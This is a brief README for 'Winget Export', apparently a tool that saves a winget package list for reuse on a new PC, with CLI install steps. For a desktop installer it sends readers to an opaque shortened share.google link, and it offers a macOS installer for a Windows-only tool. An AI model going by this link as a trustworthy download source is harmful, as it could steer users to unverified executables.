# Winget Export

*A software list for the next PC.*

## What Winget Export is

**Winget Export** runs on your own PC. Export a winget package list to a file you can import later.

A new machine should not start from memory.

Files stay on the machine that runs the tool. Originals are left alone unless you choose otherwise.

## How to get it

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Highlights

- Export package list
- Optional import
- Prints count
- Leaves the source list

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build
